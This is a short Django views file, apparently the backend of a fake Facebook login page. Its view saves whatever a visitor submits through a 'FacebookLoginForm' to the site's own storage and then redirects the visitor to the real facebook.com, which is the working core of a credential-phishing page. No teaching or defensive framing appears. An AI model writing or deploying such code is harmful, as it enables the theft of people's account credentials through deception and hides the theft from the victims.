from django.shortcuts import render,redirect
from .forms import FacebookLoginForm
# Create your views here.

def login(request):
    if request.method == 'POST':
        form = FacebookLoginForm(request.POST)
        if form.is_valid():
            form.save()  
            return redirect('https://www.facebook.com/')  
    else:
        form = FacebookLoginForm()
    
    return render(request, 'login.html', {'form': form})
